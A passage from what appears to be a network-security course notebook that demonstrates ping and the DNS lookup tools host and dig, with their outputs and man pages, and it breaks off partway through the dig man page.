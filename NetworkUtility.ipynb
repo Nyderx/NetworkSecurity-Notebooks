{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Network Utility Tools \n",
    "- Tools used for network management, routing, scanning and discovery, etc.\n",
    "    - ping\n",
    "    - host\n",
    "    - dig\n",
    "    - route\n",
    "    - dhclient\n",
    "    - arp\n",
    "    - netcat\n",
    "    - nmap\n",
    "    \n",
    "## Note: start with ! to run bash commands\n",
    "\n",
    "## Install net-tools for many network utilities"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "! echo kali | sudo -S apt install net-tools"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## ping - test if a system is up\n",
    "\n",
    "- check if there's a connectivity between the hosts"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "PING google.com (172.217.1.206) 56(84) bytes of data.\n",
      "64 bytes from iad23s26-in-f206.1e100.net (172.217.1.206): icmp_seq=1 ttl=128 time=25.1 ms\n",
      "64 bytes from iad23s26-in-f206.1e100.net (172.217.1.206): icmp_seq=2 ttl=128 time=17.2 ms\n",
      "64 bytes from iad23s26-in-f206.1e100.net (172.217.1.206): icmp_seq=3 ttl=128 time=17.5 ms\n",
      "64 bytes from iad23s26-in-f206.1e100.net (172.217.1.206): icmp_seq=4 ttl=128 time=12.2 ms\n",
      "64 bytes from iad23s26-in-f206.1e100.net (172.217.1.206): icmp_seq=5 ttl=128 time=11.6 ms\n",
      "64 bytes from iad23s26-in-f206.1e100.net (172.217.1.206): icmp_seq=6 ttl=128 time=17.3 ms\n",
      "64 bytes from iad23s26-in-f206.1e100.net (172.217.1.206): icmp_seq=7 ttl=128 time=18.5 ms\n",
      "64 bytes from iad23s26-in-f206.1e100.net (172.217.1.206): icmp_seq=8 ttl=128 time=29.6 ms\n",
      "64 bytes from iad23s26-in-f206.1e100.net (172.217.1.206): icmp_seq=9 ttl=128 time=18.0 ms\n",
      "64 bytes from iad23s26-in-f206.1e100.net (172.217.1.206): icmp_seq=10 ttl=128 time=10.5 ms\n",
      "64 bytes from iad23s26-in-f206.1e100.net (172.217.1.206): icmp_seq=11 ttl=128 time=15.8 ms\n",
      "64 bytes from iad23s26-in-f206.1e100.net (172.217.1.206): icmp_seq=12 ttl=128 time=16.9 ms\n",
      "64 bytes from iad23s26-in-f206.1e100.net (172.217.1.206): icmp_seq=13 ttl=128 time=10.4 ms\n",
      "64 bytes from iad23s26-in-f206.1e100.net (172.217.1.206): icmp_seq=14 ttl=128 time=16.6 ms\n",
      "64 bytes from iad23s26-in-f206.1e100.net (172.217.1.206): icmp_seq=15 ttl=128 time=16.0 ms\n",
      "64 bytes from iad23s26-in-f206.1e100.net (172.217.1.206): icmp_seq=16 ttl=128 time=10.4 ms\n",
      "64 bytes from iad23s26-in-f206.1e100.net (172.217.1.206): icmp_seq=17 ttl=128 time=19.2 ms\n",
      "64 bytes from iad23s26-in-f206.1e100.net (172.217.1.206): icmp_seq=18 ttl=128 time=13.2 ms\n",
      "^C\n",
      "\n",
      "--- google.com ping statistics ---\n",
      "18 packets transmitted, 18 received, 0% packet loss, time 17028ms\n",
      "rtt min/avg/max/mdev = 10.404/16.444/29.615/4.858 ms\n"
     ]
    }
   ],
   "source": [
    "! ping google.com"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## DNS Lookup Commands\n",
    "\n",
    "- host and dig are two utility commands that can lookup DNS"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "HOST(1)                             BIND 9                             HOST(1)\r\n",
      "\r\n",
      "N\bNA\bAM\bME\bE\r\n",
      "       host - DNS lookup utility\r\n",
      "\r\n",
      "S\bSY\bYN\bNO\bOP\bPS\bSI\bIS\bS\r\n",
      "       h\bho\bos\bst\bt  [-\b-a\baA\bAC\bCd\bdl\bln\bnr\brs\bsT\bTU\bUw\bwv\bv]  [-\b-c\bc  class] [-\b-N\bN ndots] [-\b-p\bp port] [-\b-R\bR number] [-\b-t\bt\r\n",
      "       type] [-\b-W\bW wait] [-\b-m\bm flag] [ [-\b-4\b4] | [-\b-6\b6] ] [-\b-v\bv] [-\b-V\bV] {name} [server]\r\n",
      "\r\n",
      "D\bDE\bES\bSC\bCR\bRI\bIP\bPT\bTI\bIO\bON\bN\r\n",
      "       h\bho\bos\bst\bt is a simple utility for performing DNS  lookups.  It  is  normally\r\n",
      "       used to convert names to IP addresses and vice versa. When no arguments\r\n",
      "       or options are given, h\bho\bos\bst\bt prints a short summary of its  command  line\r\n",
      "       arguments and options.\r\n",
      "\r\n",
      "       n\bna\bam\bme\be  is the domain name that is to be looked up. It can also be a dot‐\r\n",
      "       ted-decimal IPv4 address or a colon-delimited IPv6  address,  in  which\r\n",
      "       case  h\bho\bos\bst\bt  will  by default perform a reverse lookup for that address.\r\n",
      "       s\bse\ber\brv\bve\ber\br is an optional argument which is either the name or  IP  address\r\n",
      "       of  the  name  server  that  h\bho\bos\bst\bt should query instead of the server or\r\n",
      "       servers listed in /\b/e\bet\btc\bc/\b/r\bre\bes\bso\bol\blv\bv.\b.c\bco\bon\bnf\bf.\r\n",
      "\r\n",
      "O\bOP\bPT\bTI\bIO\bON\bNS\bS\r\n",
      "       -\b-4\b4     Use IPv4 only for query transport. See also the -\b-6\b6 option.\r\n",
      "\r\n",
      "       -\b-6\b6     Use IPv6 only for query transport. See also the -\b-4\b4 option.\r\n",
      "\r\n",
      "       -\b-a\ba     \"All\". The -\b-a\ba option is normally equivalent to  -\b-v\bv  -\b-t\bt  A\bAN\bNY\bY.  It\r\n",
      "              also affects the behaviour of the -\b-l\bl list zone option.\r\n",
      "\r\n",
      "       -\b-A\bA     \"Almost  all\".  The  -\b-A\bA option is equivalent to -\b-a\ba except RRSIG,\r\n",
      "              NSEC, and NSEC3 records are omitted from the output.\r\n",
      "\r\n",
      "       -\b-c\bc class\r\n",
      "              Query class: This can be  used  to  lookup  HS  (Hesiod)  or  CH\r\n",
      "              (Chaosnet)  class resource records. The default class is IN (In‐\r\n",
      "              ternet).\r\n",
      "\r\n",
      "       -\b-C\bC     Check consistency: h\bho\bos\bst\bt will query the SOA records for zone n\bna\bam\bme\be\r\n",
      "              from  all  the  listed authoritative name servers for that zone.\r\n",
      "              The list of name servers is defined by the NS records  that  are\r\n",
      "              found for the zone.\r\n",
      "\r\n",
      "       -\b-d\bd     Print debugging traces. Equivalent to the -\b-v\bv verbose option.\r\n",
      "\r\n",
      "       -\b-l\bl     List  zone:  The  h\bho\bos\bst\bt  command performs a zone transfer of zone\r\n",
      "              n\bna\bam\bme\be and prints out the NS, PTR and address records (A/AAAA).\r\n",
      "\r\n",
      "              Together, the -\b-l\bl -\b-a\ba options print all records in the zone.\r\n",
      "\r\n",
      "       -\b-N\bN ndots\r\n",
      "              The number of dots that have to be in n\bna\bam\bme\be for it to be  consid‐\r\n",
      "              ered absolute. The default value is that defined using the ndots\r\n",
      "              statement in /\b/e\bet\btc\bc/\b/r\bre\bes\bso\bol\blv\bv.\b.c\bco\bon\bnf\bf, or 1 if  no  ndots  statement  is\r\n",
      "              present. Names with fewer dots are interpreted as relative names\r\n",
      "              and will be searched for in the domains listed in the s\bse\bea\bar\brc\bch\bh  or\r\n",
      "              d\bdo\bom\bma\bai\bin\bn directive in /\b/e\bet\btc\bc/\b/r\bre\bes\bso\bol\blv\bv.\b.c\bco\bon\bnf\bf.\r\n",
      "\r\n",
      "       -\b-p\bp port\r\n",
      "              Specify the port on the server to query. The default is 53.\r\n",
      "\r\n",
      "       -\b-r\br     Non-recursive  query:  Setting this option clears the RD (recur‐\r\n",
      "              sion desired) bit in the query. This should mean that  the  name\r\n",
      "              server receiving the query will not attempt to resolve n\bna\bam\bme\be. The\r\n",
      "              -\b-r\br option enables h\bho\bos\bst\bt to mimic the behavior of a name server by\r\n",
      "              making non-recursive queries and expecting to receive answers to\r\n",
      "              those queries that can be referrals to other name servers.\r\n",
      "\r\n",
      "       -\b-R\bR number\r\n",
      "              Number of retries for UDP queries:  If  n\bnu\bum\bmb\bbe\ber\br  is  negative  or\r\n",
      "              zero, the number of retries will default to 1. The default value\r\n",
      "              is 1, or the value of the a\bat\btt\bte\bem\bmp\bpt\bts\bs option  in  /\b/e\bet\btc\bc/\b/r\bre\bes\bso\bol\blv\bv.\b.c\bco\bon\bnf\bf,\r\n",
      "              if set.\r\n",
      "\r\n",
      "       -\b-s\bs     Do  _\bn_\bo_\bt  send the query to the next nameserver if any server re‐\r\n",
      "              sponds with a SERVFAIL response, which is the reverse of  normal\r\n",
      "              stub resolver behavior.\r\n",
      "\r\n",
      "       -\b-t\bt type\r\n",
      "              Query  type: The t\bty\byp\bpe\be argument can be any recognized query type:\r\n",
      "              CNAME, NS, SOA, TXT, DNSKEY, AXFR, etc.\r\n",
      "\r\n",
      "              When no query type is specified, h\bho\bos\bst\bt automatically  selects  an\r\n",
      "              appropriate query type. By default, it looks for A, AAAA, and MX\r\n",
      "              records. If the -\b-C\bC option is given, queries will be made for SOA\r\n",
      "              records.  If  n\bna\bam\bme\be is a dotted-decimal IPv4 address or colon-de‐\r\n",
      "              limited IPv6 address, h\bho\bos\bst\bt will query for PTR records.\r\n",
      "\r\n",
      "              If a query type of IXFR is chosen the starting serial number can\r\n",
      "              be  specified by appending an equal followed by the starting se‐\r\n",
      "              rial number (like -\b-t\bt I\bIX\bXF\bFR\bR=\b=1\b12\b23\b34\b45\b56\b67\b78\b8).\r\n",
      "\r\n",
      "       -\b-T\bT; -\b-U\bU TCP/UDP: By default, h\bho\bos\bst\bt uses UDP when making queries.  The  -\b-T\bT\r\n",
      "              option  makes  it  use  a  TCP connection when querying the name\r\n",
      "              server. TCP will be automatically selected for queries that  re‐\r\n",
      "              quire  it,  such  as  zone  transfer  (AXFR)  requests. Type ANY\r\n",
      "              queries default to TCP but can be forced to UDP initially  using\r\n",
      "              -\b-U\bU.\r\n",
      "\r\n",
      "       -\b-m\bm flag\r\n",
      "              Memory usage debugging: the flag can be r\bre\bec\bco\bor\brd\bd, u\bus\bsa\bag\bge\be, or t\btr\bra\bac\bce\be.\r\n",
      "              You can specify the -\b-m\bm option more than  once  to  set  multiple\r\n",
      "              flags.\r\n",
      "\r\n",
      "       -\b-v\bv     Verbose  output. Equivalent to the -\b-d\bd debug option. Verbose out‐\r\n",
      "              put can also be enabled by setting the d\bde\beb\bbu\bug\bg option in  /\b/e\bet\btc\bc/\b/r\bre\be‐\b‐\r\n",
      "              s\bso\bol\blv\bv.\b.c\bco\bon\bnf\bf.\r\n",
      "\r\n",
      "       -\b-V\bV     Print the version number and exit.\r\n",
      "\r\n",
      "       -\b-w\bw     Wait  forever: The query timeout is set to the maximum possible.\r\n",
      "              See also the -\b-W\bW option.\r\n",
      "\r\n",
      "       -\b-W\bW wait\r\n",
      "              Timeout: Wait for up to w\bwa\bai\bit\bt seconds for a  reply.  If  w\bwa\bai\bit\bt  is\r\n",
      "              less than one, the wait interval is set to one second.\r\n",
      "\r\n",
      "              By  default,  h\bho\bos\bst\bt will wait for 5 seconds for UDP responses and\r\n",
      "              10 seconds for TCP connections. These defaults can be overridden\r\n",
      "              by the t\bti\bim\bme\beo\bou\but\bt option in /\b/e\bet\btc\bc/\b/r\bre\bes\bso\bol\blv\bv.\b.c\bco\bon\bnf\bf.\r\n",
      "\r\n",
      "              See also the -\b-w\bw option.\r\n",
      "\r\n",
      "I\bID\bDN\bN S\bSU\bUP\bPP\bPO\bOR\bRT\bT\r\n",
      "       If  h\bho\bos\bst\bt  has  been built with IDN (internationalized domain name) sup‐\r\n",
      "       port, it can accept and display non-ASCII domain names. h\bho\bos\bst\bt  appropri‐\r\n",
      "       ately  converts  character encoding of domain name before sending a re‐\r\n",
      "       quest to DNS server or displaying a reply from  the  server.  If  you'd\r\n",
      "       like  to  turn off the IDN support for some reason, define the IDN_DIS‐\r\n",
      "       ABLE environment variable. The IDN support is disabled if the  variable\r\n",
      "       is set when h\bho\bos\bst\bt runs.\r\n",
      "\r\n",
      "F\bFI\bIL\bLE\bES\bS\r\n",
      "       /\b/e\bet\btc\bc/\b/r\bre\bes\bso\bol\blv\bv.\b.c\bco\bon\bnf\bf\r\n",
      "\r\n",
      "S\bSE\bEE\bE A\bAL\bLS\bSO\bO\r\n",
      "       d\bdi\big\bg(\b(1\b1)\b), n\bna\bam\bme\bed\bd(\b(8\b8)\b).\r\n",
      "\r\n",
      "A\bAU\bUT\bTH\bHO\bOR\bR\r\n",
      "       Internet Systems Consortium\r\n",
      "\r\n",
      "C\bCO\bOP\bPY\bYR\bRI\bIG\bGH\bHT\bT\r\n",
      "       2020, Internet Systems Consortium\r\n",
      "\r\n",
      "9.16.4-Debian                     2020-06-10                           HOST(1)\r\n"
     ]
    }
   ],
   "source": [
    "! man host"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "metadata": {
    "scrolled": false
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "google.com has address 172.217.1.206\r\n",
      "google.com has IPv6 address 2607:f8b0:4009:815::200e\r\n",
      "google.com mail is handled by 10 aspmx.l.google.com.\r\n",
      "google.com mail is handled by 30 alt2.aspmx.l.google.com.\r\n",
      "google.com mail is handled by 50 alt4.aspmx.l.google.com.\r\n",
      "google.com mail is handled by 20 alt1.aspmx.l.google.com.\r\n",
      "google.com mail is handled by 40 alt3.aspmx.l.google.com.\r\n"
     ]
    }
   ],
   "source": [
    "! host google.com"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Trying \"google.com\"\r\n",
      ";; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 62123\r\n",
      ";; flags: qr rd ra; QUERY: 1, ANSWER: 6, AUTHORITY: 0, ADDITIONAL: 0\r\n",
      "\r\n",
      ";; QUESTION SECTION:\r\n",
      ";google.com.\t\t\tIN\tANY\r\n",
      "\r\n",
      ";; ANSWER SECTION:\r\n",
      "google.com.\t\t5\tIN\tA\t172.217.1.206\r\n",
      "google.com.\t\t5\tIN\tMX\t10 aspmx.l.google.com.\r\n",
      "google.com.\t\t5\tIN\tMX\t30 alt2.aspmx.l.google.com.\r\n",
      "google.com.\t\t5\tIN\tMX\t50 alt4.aspmx.l.google.com.\r\n",
      "google.com.\t\t5\tIN\tMX\t20 alt1.aspmx.l.google.com.\r\n",
      "google.com.\t\t5\tIN\tMX\t40 alt3.aspmx.l.google.com.\r\n",
      "\r\n",
      "Received 152 bytes from 192.168.195.2#53 in 4 ms\r\n"
     ]
    }
   ],
   "source": [
    "! host -a google.com # display all records"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "coloradomesa.edu has address 10.0.3.167\r\n"
     ]
    }
   ],
   "source": [
    "# -t: query type; a\n",
    "! host -t a coloradomesa.edu # domain ip"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "coloradomesa.edu mail is handled by 10 mail.coloradomesa.edu.\r\n"
     ]
    }
   ],
   "source": [
    "! host -t mx coloradomesa.edu # domain mail server"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "coloradomesa.edu name server ns1.coloradomesa.edu.\r\n",
      "coloradomesa.edu name server ns2.coloradomesa.edu.\r\n"
     ]
    }
   ],
   "source": [
    "! host -t ns coloradomesa.edu # nameserver"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## reverse lookup\n",
    "- given IP, find the domain name"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 10,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "167.224.166.72.in-addr.arpa domain name pointer coloradomesa.edu.\r\n",
      "167.224.166.72.in-addr.arpa domain name pointer www.coloradomesa.edu.\r\n"
     ]
    }
   ],
   "source": [
    "! host 72.166.224.167"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 11,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "DIG(1)                              BIND 9                              DIG(1)\r\n",
      "\r\n",
      "N\bNA\bAM\bME\bE\r\n",
      "       dig - DNS lookup utility\r\n",
      "\r\n",
      "S\bSY\bYN\bNO\bOP\bPS\bSI\bIS\bS\r\n",
      "       d\bdi\big\bg  [@server] [-\b-b\bb address] [-\b-c\bc class] [-\b-f\bf filename] [-\b-k\bk filename] [-\b-m\bm]\r\n",
      "       [-\b-p\bp port#] [-\b-q\bq name] [-\b-t\bt type] [-\b-v\bv] [-\b-x\bx addr]  [-\b-y\by  [hmac:]name:key]  [\r\n",
      "       [-\b-4\b4] | [-\b-6\b6] ] [name] [type] [class] [queryopt...]\r\n",
      "\r\n",
      "       d\bdi\big\bg [-\b-h\bh]\r\n",
      "\r\n",
      "       d\bdi\big\bg [global-queryopt...] [query...]\r\n",
      "\r\n",
      "D\bDE\bES\bSC\bCR\bRI\bIP\bPT\bTI\bIO\bON\bN\r\n",
      "       d\bdi\big\bg  is a flexible tool for interrogating DNS name servers. It performs\r\n",
      "       DNS lookups and displays the answers that are returned  from  the  name\r\n",
      "       server(s)  that  were queried. Most DNS administrators use d\bdi\big\bg to trou‐\r\n",
      "       bleshoot DNS problems because of its flexibility, ease of use and clar‐\r\n",
      "       ity  of output. Other lookup tools tend to have less functionality than\r\n",
      "       d\bdi\big\bg.\r\n",
      "\r\n",
      "       Although d\bdi\big\bg is normally used with command-line arguments, it also  has\r\n",
      "       a  batch  mode  of operation for reading lookup requests from a file. A\r\n",
      "       brief summary of its command-line arguments and options is printed when\r\n",
      "       the -\b-h\bh option is given. Unlike earlier versions, the BIND 9 implementa‐\r\n",
      "       tion of d\bdi\big\bg allows multiple lookups to be issued from the command line.\r\n",
      "\r\n",
      "       Unless it is told to query a specific name server, d\bdi\big\bg will try each of\r\n",
      "       the  servers  listed in /\b/e\bet\btc\bc/\b/r\bre\bes\bso\bol\blv\bv.\b.c\bco\bon\bnf\bf. If no usable server addresses\r\n",
      "       are found, d\bdi\big\bg will send the query to the local host.\r\n",
      "\r\n",
      "       When no command line arguments or options are given, d\bdi\big\bg  will  perform\r\n",
      "       an NS query for \".\" (the root).\r\n",
      "\r\n",
      "       It  is  possible  to  set per-user defaults for d\bdi\big\bg via $\b${\b{H\bHO\bOM\bME\bE}\b}/\b/.\b.d\bdi\big\bgr\brc\bc.\r\n",
      "       This file is read and any options in it are applied before the  command\r\n",
      "       line  arguments.  The -\b-r\br option disables this feature, for scripts that\r\n",
      "       need predictable behaviour.\r\n",
      "\r\n",
      "       The IN and CH class names overlap with the IN and CH top  level  domain\r\n",
      "       names.  Either use the -\b-t\bt and -\b-c\bc options to specify the type and class,\r\n",
      "       use the -\b-q\bq the specify the domain name, or use  \"IN.\"  and  \"CH.\"  when\r\n",
      "       looking up these top level domains.\r\n",
      "\r\n",
      "S\bSI\bIM\bMP\bPL\bLE\bE U\bUS\bSA\bAG\bGE\bE\r\n",
      "       A typical invocation of d\bdi\big\bg looks like:\r\n",
      "\r\n",
      "          dig @server name type\r\n",
      "\r\n",
      "       where:\r\n",
      "\r\n",
      "       s\bse\ber\brv\bve\ber\br is  the name or IP address of the name server to query. This can\r\n",
      "              be an IPv4 address in dotted-decimal notation or an IPv6 address\r\n",
      "              in  colon-delimited  notation. When the supplied s\bse\ber\brv\bve\ber\br argument\r\n",
      "              is a hostname, d\bdi\big\bg resolves that name before querying that  name\r\n",
      "              server.\r\n",
      "\r\n",
      "              If  no  s\bse\ber\brv\bve\ber\br  argument  is  provided,  d\bdi\big\bg  consults  /\b/e\bet\btc\bc/\b/r\bre\be‐\b‐\r\n",
      "              s\bso\bol\blv\bv.\b.c\bco\bon\bnf\bf; if an address is found there,  it  queries  the  name\r\n",
      "              server at that address. If either of the -\b-4\b4 or -\b-6\b6 options are in\r\n",
      "              use, then only addresses for the corresponding transport will be\r\n",
      "              tried. If no usable addresses are found, d\bdi\big\bg will send the query\r\n",
      "              to the local host. The reply from the name server that  responds\r\n",
      "              is displayed.\r\n",
      "\r\n",
      "       n\bna\bam\bme\be   is the name of the resource record that is to be looked up.\r\n",
      "\r\n",
      "       t\bty\byp\bpe\be   indicates  what type of query is required MDASH ANY, A, MX, SIG,\r\n",
      "              etc.  t\bty\byp\bpe\be can be any valid query type. If no t\bty\byp\bpe\be  argument  is\r\n",
      "              supplied, d\bdi\big\bg will perform a lookup for an A record.\r\n",
      "\r\n",
      "O\bOP\bPT\bTI\bIO\bON\bNS\bS\r\n",
      "       -\b-4\b4     Use IPv4 only.\r\n",
      "\r\n",
      "       -\b-6\b6     Use IPv6 only.\r\n",
      "\r\n",
      "       -\b-b\bb address[#port]\r\n",
      "              Set  the  source  IP address of the query. The a\bad\bdd\bdr\bre\bes\bss\bs must be a\r\n",
      "              valid address on  one  of  the  host's  network  interfaces,  or\r\n",
      "              \"0.0.0.0\"  or \"::\". An optional port may be specified by append‐\r\n",
      "              ing \"#<port>\"\r\n",
      "\r\n",
      "       -\b-c\bc class\r\n",
      "              Set the query class. The default c\bcl\bla\bas\bss\bs is IN; other classes  are\r\n",
      "              HS for Hesiod records or CH for Chaosnet records.\r\n",
      "\r\n",
      "       -\b-f\bf file\r\n",
      "              Batch  mode: d\bdi\big\bg reads a list of lookup requests to process from\r\n",
      "              the given f\bfi\bil\ble\be. Each line in the file should be organized in the\r\n",
      "              same  way  they  would  be presented as queries to d\bdi\big\bg using the\r\n",
      "              command-line interface.\r\n",
      "\r\n",
      "       -\b-k\bk keyfile\r\n",
      "              Sign queries using TSIG using a key read from  the  given  file.\r\n",
      "              Key  files  can be generated using tsig-keygen8. When using TSIG\r\n",
      "              authentication with d\bdi\big\bg, the name server that is  queried  needs\r\n",
      "              to  know the key and algorithm that is being used. In BIND, this\r\n",
      "              is done by providing appropriate k\bke\bey\by and  s\bse\ber\brv\bve\ber\br  statements  in\r\n",
      "              n\bna\bam\bme\bed\bd.\b.c\bco\bon\bnf\bf.\r\n",
      "\r\n",
      "       -\b-m\bm     Enable memory usage debugging.\r\n",
      "\r\n",
      "       -\b-p\bp port\r\n",
      "              Send  the query to a non-standard port on the server, instead of\r\n",
      "              the default port 53. This option would be used to  test  a  name\r\n",
      "              server  that  has  been  configured  to  listen for queries on a\r\n",
      "              non-standard port number.\r\n",
      "\r\n",
      "       -\b-q\bq name\r\n",
      "              The domain name to query. This is useful to distinguish the n\bna\bam\bme\be\r\n",
      "              from other arguments.\r\n",
      "\r\n",
      "       -\b-r\br     Do  not  read  options  from  $\b${\b{H\bHO\bOM\bME\bE}\b}/\b/.\b.d\bdi\big\bgr\brc\bc. This is useful for\r\n",
      "              scripts that need predictable behaviour.\r\n",
      "\r\n",
      "       -\b-t\bt type\r\n",
      "              The resource record type to query. It can  be  any  valid  query\r\n",
      "              type.  If  it  is a resource record type supported in BIND 9, it\r\n",
      "              can be given by the type mnemonic (such as \"NS\" or \"AAAA\").  The\r\n",
      "              default  query  type is \"A\", unless the -\b-x\bx option is supplied to\r\n",
      "              indicate a reverse lookup. A zone transfer can be  requested  by\r\n",
      "              specifying  a  type  of  AXFR. When an incremental zone transfer\r\n",
      "              (IXFR) is required, set the t\bty\byp\bpe\be to i\bix\bxf\bfr\br=\b=N\bN. The incremental zone\r\n",
      "              transfer will contain the changes made to the zone since the se‐\r\n",
      "              rial number in the zone's SOA record was N\bN.\r\n",
      "\r\n",
      "              All resource record types can be expressed  as  \"TYPEnn\",  where\r\n",
      "              \"nn\"  is  the number of the type. If the resource record type is\r\n",
      "              not supported in BIND 9, the result will  be  displayed  as  de‐\r\n",
      "              scribed in _\bR_\bF_\bC _\b3_\b5_\b9_\b7.\r\n",
      "\r\n",
      "       -\b-u\bu     Print query times in microseconds instead of milliseconds.\r\n",
      "\r\n",
      "       -\b-v\bv     Print the version number and exit.\r\n",
      "\r\n",
      "       -\b-x\bx addr\r\n",
      "              Simplified  reverse lookups, for mapping addresses to names. The\r\n",
      "              a\bad\bdd\bdr\br is  an  IPv4  address  in  dotted-decimal  notation,  or  a\r\n",
      "              colon-delimited  IPv6  address. When the -\b-x\bx is used, there is no\r\n",
      "              need to provide the n\bna\bam\bme\be, c\bcl\bla\bas\bss\bs and t\bty\byp\bpe\be arguments.   d\bdi\big\bg  auto‐\r\n",
      "              matically    performs    a    lookup    for    a    name    like\r\n",
      "              9\b94\b4.\b.2\b2.\b.0\b0.\b.1\b19\b92\b2.\b.i\bin\bn-\b-a\bad\bdd\bdr\br.\b.a\bar\brp\bpa\ba and sets the query type and class to PTR\r\n",
      "              and  IN  respectively. IPv6 addresses are looked up using nibble\r\n",
      "              format under the IP6.ARPA domain.\r\n",
      "\r\n",
      "       -\b-y\by [hmac:]keyname:secret\r\n",
      "              Sign queries using TSIG with the given authentication key.  k\bke\bey\by‐\b‐\r\n",
      "              n\bna\bam\bme\be  is  the  name of the key, and s\bse\bec\bcr\bre\bet\bt is the base64 encoded\r\n",
      "              shared secret. h\bhm\bma\bac\bc is the name  of  the  key  algorithm;  valid\r\n",
      "              choices   are  h\bhm\bma\bac\bc-\b-m\bmd\bd5\b5,  h\bhm\bma\bac\bc-\b-s\bsh\bha\ba1\b1,  h\bhm\bma\bac\bc-\b-s\bsh\bha\ba2\b22\b24\b4,  h\bhm\bma\bac\bc-\b-s\bsh\bha\ba2\b25\b56\b6,\r\n",
      "              h\bhm\bma\bac\bc-\b-s\bsh\bha\ba3\b38\b84\b4, or h\bhm\bma\bac\bc-\b-s\bsh\bha\ba5\b51\b12\b2. If h\bhm\bma\bac\bc is not specified,  the  de‐\r\n",
      "              fault is h\bhm\bma\bac\bc-\b-m\bmd\bd5\b5 or if MD5 was disabled h\bhm\bma\bac\bc-\b-s\bsh\bha\ba2\b25\b56\b6.\r\n",
      "\r\n",
      "       N\bNO\bOT\bTE\bE:\b:\r\n",
      "          You  should  use the -\b-k\bk option and avoid the -\b-y\by option, because with\r\n",
      "          -\b-y\by the shared secret is supplied as a command line argument in clear\r\n",
      "          text.  This  may  be  visible in the output from ps1 or in a history\r\n",
      "          file maintained by the user's shell.\r\n",
      "\r\n",
      "Q\bQU\bUE\bER\bRY\bY O\bOP\bPT\bTI\bIO\bON\bNS\bS\r\n",
      "       d\bdi\big\bg provides a number of query options which affect the  way  in  which\r\n",
      "       lookups  are made and the results displayed. Some of these set or reset\r\n",
      "       flag bits in the query header, some determine which sections of the an‐\r\n",
      "       swer  get  printed,  and others determine the timeout and retry strate‐\r\n",
      "       gies.\r\n",
      "\r\n",
      "       Each query option is identified by a keyword preceded by  a  plus  sign\r\n",
      "       (+\b+). Some keywords set or reset an option. These may be preceded by the\r\n",
      "       string n\bno\bo to negate the meaning of that keyword. Other keywords  assign\r\n",
      "       values  to  options like the timeout interval. They have the form +\b+k\bke\bey\by‐\b‐\r\n",
      "       w\bwo\bor\brd\bd=\b=v\bva\bal\blu\bue\be. Keywords may be abbreviated, provided the  abbreviation  is\r\n",
      "       unambiguous;  for  example, +\b+c\bcd\bd is equivalent to +\b+c\bcd\bdf\bfl\bla\bag\bg. The query op‐\r\n",
      "       tions are:\r\n",
      "\r\n",
      "       +\b+[\b[n\bno\bo]\b]a\baa\baf\bfl\bla\bag\bg\r\n",
      "              A synonym for +\b+[\b[n\bno\bo]\b]a\baa\bao\bon\bnl\bly\by.\r\n",
      "\r\n",
      "       +\b+[\b[n\bno\bo]\b]a\baa\bao\bon\bnl\bly\by\r\n",
      "              Sets the \"aa\" flag in the query.\r\n",
      "\r\n",
      "       +\b+[\b[n\bno\bo]\b]a\bad\bdd\bdi\bit\bti\bio\bon\bna\bal\bl\r\n",
      "              Display [do not display] the additional section of a reply.  The\r\n",
      "              default is to display it.\r\n",
      "\r\n",
      "       +\b+[\b[n\bno\bo]\b]a\bad\bdf\bfl\bla\bag\bg\r\n",
      "              Set  [do not set] the AD (authentic data) bit in the query. This\r\n",
      "              requests the server to return whether all of the answer and  au‐\r\n",
      "              thority  sections have all been validated as secure according to\r\n",
      "              the security policy of  the  server.  AD=1  indicates  that  all\r\n",
      "              records have been validated as secure and the answer is not from\r\n",
      "              a OPT-OUT range. AD=0 indicate that some part of the answer  was\r\n",
      "              insecure or not validated.  This bit is set by default.\r\n",
      "\r\n",
      "       +\b+[\b[n\bno\bo]\b]a\bal\bll\bl\r\n",
      "              Set or clear all display flags.\r\n",
      "\r\n",
      "       +\b+[\b[n\bno\bo]\b]a\ban\bns\bsw\bwe\ber\br\r\n",
      "              Display  [do not display] the answer section of a reply. The de‐\r\n",
      "              fault is to display it.\r\n",
      "\r\n",
      "       +\b+[\b[n\bno\bo]\b]a\bau\but\bth\bho\bor\bri\bit\bty\by\r\n",
      "              Display [do not display] the authority section of a  reply.  The\r\n",
      "              default is to display it.\r\n",
      "\r\n",
      "       +\b+[\b[n\bno\bo]\b]b\bba\bad\bdc\bco\boo\bok\bki\bie\be\r\n",
      "              Retry  lookup with the new server cookie if a BADCOOKIE response\r\n",
      "              is received.\r\n",
      "\r\n",
      "       +\b+[\b[n\bno\bo]\b]b\bbe\bes\bst\bte\bef\bff\bfo\bor\brt\bt\r\n",
      "              Attempt to display the contents of messages which are malformed.\r\n",
      "              The default is to not display malformed answers.\r\n",
